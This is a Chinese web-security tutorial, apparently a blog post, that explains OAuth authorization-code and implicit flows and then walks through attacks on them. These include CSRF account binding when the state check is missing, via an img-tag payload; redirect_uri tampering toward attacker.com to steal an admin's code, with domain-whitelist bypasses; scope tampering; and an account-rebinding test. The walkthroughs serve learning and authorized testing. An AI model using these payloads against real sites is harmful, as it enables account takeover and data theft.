---
title: 身份验证篇&OAuth认证&授权分类及参数&重定向接管&State缺陷&Scope篡改
published: 2026-07-20
description: OAuth认证的授权码、隐式授权两种模式，重点分析因state缺失、redirect_uri可篡改、scope权限不当引发的CSRF绑定劫持、回调地址篡改与信息泄露漏洞，完整攻击流程及换绑测试方法。
tags:
  - OAuth
  - 越权
  - Web攻防
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-OAuth认证-授权逻辑&授权分类&参数解释
2. WEB攻防-OAuth认证-无State&重定向接管&篡改Scope

# 解释

OAuth：一种常用的授权框架，它允许网站和Web应用程序请求对另一个应用程序上的用户帐户的有限访问权限，像那种允许使用第三方账号（QQ、微信等）登录的网站，可能就是使用的OAuth框架。

# 类型

授权类型：授权码模式，隐式授权类型等

授权码模式更安全

## 授权码授权

跟微信和技术论坛的例子类似，三个角色：客户端、授权服务器和资源服务器，流程如下：

1、授权请求：

客户端向授权服务器发送授权请求，如下：

```
GET /authorize?client_id=123  
              &redirect_uri=http://client-app.com/test  
              &response_type=code  
              &scope=profile  
              &state=abcd1234 HTTP/1.1  
Host: authorization-server.com
```

`client_id`：客户端在授权服务器的ID（公开）。

`redirect_uri`：授权完成后，授权服务器回调客户端的地址。

`response_type`：声明授权类型，code是授权码授权。

`scope`：告诉授权服务器，客户端要访问哪些用户数据，profile是仅请求用户的基本信息（如用户名、头像）。

`state`：随机字符串，防止CSRF。

2、用户登录与授权：

用户登录后，会跳到授权页面，显示客户端需要请求哪些信息，并提示是否允许授权。

3、返回授权码：

允许授权后，授权服务器会生成一个授权码（短期有效），通过重定向将授权码返回给客户端，重定向地址就是第一步请求时指定的回调地址。

```
GET /callback?code=123456&state=abcd1234 HTTP/1.1
Host: client-app.com
```

`code`：授权码。

4、令牌交换：

客户端后端向授权服务器发送请求，用授权码换取访问令牌。

```
POST /token HTTP/1.1  
Host: authorization-server.com  
Content-Type: application/x-www-form-urlencoded  
  
code=123456  
&client_id=123  
&client_secret=secret_key  
&redirect_uri=http://client-app.com/test  
&grant_type=authorization_code
```

`client_secret`：客户端密钥，用来验证客户端身份。

`grant_type`：指定授权类型，此处固定为 `authorization_code`，表示使用授权码流程。

授权服务器验证客户端身份，通过后返回访问令牌。

```
{
  "access_token": "123456789",  
  "token_type": "Bearer",  
  "expires_in": 3600
}
```

`access_token`：访问令牌。

`token_type`：令牌类型，告诉客户端如何携带令牌访问资源服务器，Bearer是持有者令牌。

`expires_in`：令牌有效期，以秒为单位。

5、访问资源：

客户端携带访问令牌向资源服务器发起请求，获取用户数据。

```
GET /userinfo HTTP/1.1
Host: resource-server.com
Authorization: Bearer 123456789
```

6、返回数据：

资源服务器验证令牌后，返回用户数据。

```
{
	"username": "hack",
	"email": "hack@example.com"
}
```

## 隐式授权

隐式授权不用先获取授权码，再换取访问令牌，而是用户允许授权后，直接获取访问令牌，但是安全性要比授权码授权要低。

1、授权请求：

客户端向授权服务器发起授权请求。

```
GET /authorize?client_id=123  
              &redirect_uri=https://client-app.com/test  
              &response_type=token  
              &scope=profile  
              &state=abcd1234 HTTP/1.1  
Host: authorization-server.com
```

和授权码授权的区别在于，`response_type=token`，声明授权类型为隐式授权。

2、用户登录与授权：

用户登录后，询问用户是否允许授权。

3、返回访问令牌：

允许授权后，重定向到回调地址，并通过URL片段返回访问令牌。

```
HTTP/1.1 302 Found  
Location: https://client-app.com/test#access_token=123456789&token_type=Bearer&expires_in=3600&state=abcd1234
```

URL片段（#后的内容）不会发送到客户端的后端，而是在前端直接处理。

4、前端访问资源：

客户端将访问令牌发送到资源服务器，用来请求用户数据。

```
GET /userinfo HTTP/1.1  
Host: resource-server.com  
Authorization: Bearer 123456789
```

5、返回用户数据：

资源服务器验证令牌后，返回用户数据。

```
{  
  "username": "hack",  
  "email": "hack@example.com"  
}
```

## 参考文章

https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A

https://mp.weixin.qq.com/s/ATjdIxSOruY-_lCCs2kcGg

# 安全

靶场环境：[portswigger.net/web-security/all-labs#oauth-authentication](http://portswigger.net/web-security/all-labs#oauth-authentication)  
文章参考：[blog.csdn.net/weixin_39190897/article/details/139885599](https://blog.csdn.net/weixin_39190897/article/details/139885599)

## OAuth隐式认证绕过

文章参考：https://superhero.blog.csdn.net/article/details/149582909

## 注册资源SSRF被利用

文章参考：https://superhero.blog.csdn.net/article/details/149582909

## 存在CSRF缺陷用户被绑定 无state csrf

大概流程：

1. **攻击者发起绑定（用自己的账号）**
    
    - 攻击者打开 `blog.com/bind?type=github`。
        
    - 跳转到 GitHub 授权，攻击者**用自己的 GitHub 账号**完成授权。
        
    - GitHub 返回一个 `code`（授权码）给攻击者。
        
2. **攻击者截获自己的回调请求**
    
    - 攻击者拿到自己的回调 URL（携带自己的 `code`）：`https://blog.com/callback?code=attacker_code`
        
    - 正常流程下，这个请求会把攻击者的 GitHub 账号绑定到攻击者的博客账号上。
        
3. **攻击者构造 CSRF 恶意页面（关键）**
    
    - 攻击者**没有提交这个请求**，而是把它改造成一个 CSRF Payload（例如图片链接、表单自动提交等）：`<img src="https://blog.com/callback?code=attacker_code" />`
        
    - 把这个恶意页面放到某个论坛、邮件或社交平台，诱骗**高权限的受害者用户**点击。
        
4. **受害者点击恶意链接（触发 CSRF）**
    
    - 受害者在浏览器中**已经登录了博客 `blog.com`**（Session/Cookie 有效）。
        
    - 受害者点击恶意链接，浏览器带着受害者的 Cookie 向 `blog.com/callback?code=attacker_code` 发起请求。
        
5. **服务器处理请求（漏洞触发）**
    
    - 服务器收到请求，发现 `code` 有效（确实是 GitHub 返回的合法授权码）。
        
    - 服务器**没有校验 `state`**，无法区分这个 `code` 是刚才谁发起的绑定请求。
        
    - 于是，服务器**将攻击者的 GitHub 账号（attacker_code 对应的账号）绑定到了当前登录的受害者账户上**。
        
6. **提权完成**
    
    - 攻击者此时用自己 GitHub 账号登录博客，**直接进入受害者的高权限账户**（Admin/博主）。
        
    - 攻击者成功提权，完全控制了受害者账户。

## CSRF缺陷redirect_uri 劫持code帐户

第 1 步：攻击者发现并篡改授权链接

攻击者正常访问 `blog.com` 的“用 GitHub 登录”按钮，抓取或构造授权请求链接。正常链接如下：

```
https://github.com/login/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://blog.com/oauth/callback&
  response_type=code&
  scope=user
```

攻击者将 `redirect_uri` 修改为自己控制的服务器（`attacker.com`）：

```
https://github.com/login/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://attacker.com/callback&   <-- 篡改此处
  response_type=code&
  scope=user
```

> **绕过技巧**（如果服务端有简单校验）：有时攻击者会利用 `https://blog.com.attacker.com` 或 `https://attacker.com/callback?from=blog.com` 来绕过不严谨的域名白名单。

第 2 步：攻击者构造恶意页面诱骗管理员点击

攻击者把上面篡改后的链接做成一个短链接或伪装成“查看最新运营数据”的按钮，通过邮件、飞书、钉钉等工具发送给**管理员**。

第 3 步：管理员点击链接并授权

管理员点击链接后，由于浏览器里存着 GitHub 的登录态，GitHub 会直接弹出授权页面（或自动跳转）。管理员以为这是正常的 `blog.com` 授权，顺手点击了 **“Authorize”**。

第 4 步：GitHub 将 Code 发送给攻击者

因为 `redirect_uri` 被改成了 `attacker.com/callback`，GitHub 在生成 `code` 后，**不会发给 `blog.com`**，而是直接通过 302 跳转把 `code` 发给了攻击者的服务器：

```
HTTP/1.1 302 Found
Location: https://attacker.com/callback?code=admin_github_code_xxxxx
```

攻击者服务器的访问日志里直接就记录下了这个包含 `code` 的请求。

第 5 步：攻击者截获 Code 并自己使用

攻击者从日志中提取出 `code=admin_github_code_xxxxx`。然后攻击者**打开自己的浏览器**，访问正常的回调地址，并把截获的 `code` 填入：

```
https://blog.com/oauth/callback?code=admin_github_code_xxxxx
```

第 6 步：服务器完成登录，提权成功

`blog.com` 收到这个 `code` 后，拿着它去 GitHub 换取 `access_token` 和用户信息（邮箱、昵称）。  

因为 `code` 是管理员在 GitHub 授权生成的，所以换回来的信息是管理员的 GitHub 信息。  

`blog.com` 根据 GitHub 信息找到对应的管理员本地账号，**直接将攻击者登录成了管理员**。

攻击者此时顺利进入后台，提权（ATO）完成。

## scope篡改升级范围信息获取

文章参考：

https://mp.weixin.qq.com/s/ATjdIxSOruY-_lCCs2kcGg

篡改scope值，可以获取其他信息

# 复盘

https://mp.weixin.qq.com/s/TSsQ_mWGsFYZiF_RBdfbKg

https://mp.weixin.qq.com/s/NuNkzax8nb72qb-S1RvTnQ

https://mp.weixin.qq.com/s/QuhNuVyb2uy2T-br-mxAJw

# 例子

如何测试 OAuth 换绑实现账户接管漏洞

1. 分别在两个浏览器上注册两个账号，分别为账号 A 和账号 B

2. 在账号A上走完一遍绑定第三方平台的流程，抓住最后绑定的那个数据包，Send to Repeater然后Drop掉

3. 在登陆了账号B的浏览器上，直接去访问账号A先前绑定的URL，观察B是否新绑定了第三方平台，如果是，则存在该漏洞，否则就不存在

演示案例：xxxxx